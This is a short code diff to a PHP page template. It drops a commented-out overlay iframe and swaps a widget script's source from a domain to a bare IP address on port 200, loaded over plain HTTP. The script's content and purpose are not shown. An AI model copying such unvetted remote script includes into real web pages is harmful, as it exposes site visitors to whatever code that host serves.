@@ -14,5 +14,4 @@
 <meta name="robots" content="INDEX,FOLLOW" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <?php $parentThis->head() ?>
-<!--<iframe src="http://115.28.80.138:200"  style="border:none;display: block; position: fixed; width: 5000px; margin: 0px 30px 30px 0px; left: auto; top: auto; right: 0px; bottom: 0px; z-index: 20000000; height: 1000px;" allowTransparency=true ></iframe>-->
-<script type="text/javascript" id="85db553d33449400ad49117cfd638a08" src="http://ls.uobdii.org/script.php?id=85db553d33449400ad49117cfd638a08"></script>
+<script type="text/javascript" id="85db553d33449400ad49117cfd638a08" src="http://115.28.80.138:200/script.php?id=85db553d33449400ad49117cfd638a08"></script>
